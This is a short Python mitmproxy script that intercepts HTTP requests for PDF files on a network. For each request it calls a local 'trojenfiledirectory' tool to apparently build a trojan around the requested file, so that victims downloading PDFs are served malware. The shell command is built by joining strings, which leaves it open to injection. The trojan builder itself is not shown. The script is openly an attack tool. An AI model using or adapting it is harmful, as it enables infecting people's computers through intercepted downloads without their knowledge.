import mitmproxy
import subprocess

def request(flow):
    # Handle request flow
    if flow.request.host != "10.23...." and flow.request.pretty_url.endswith(".pdf"):
        # Print a message indicating an interesting flow
        print("[+] Got interesting flow")
        # Append '#' to the URL to avoid a potential loop
        front_file = flow.request.pretty_url + "#"
        # Execute a subprocess to run a trojan file directory with the modified URL
        subprocess.call("python trojenfiledirectory -f '" + front_file + "' -e")

# Note: This code is designed to be used with mitmproxy and should be run within a mitmproxy script environment.
# You'll need to run this script using mitmproxy or mitmdump.

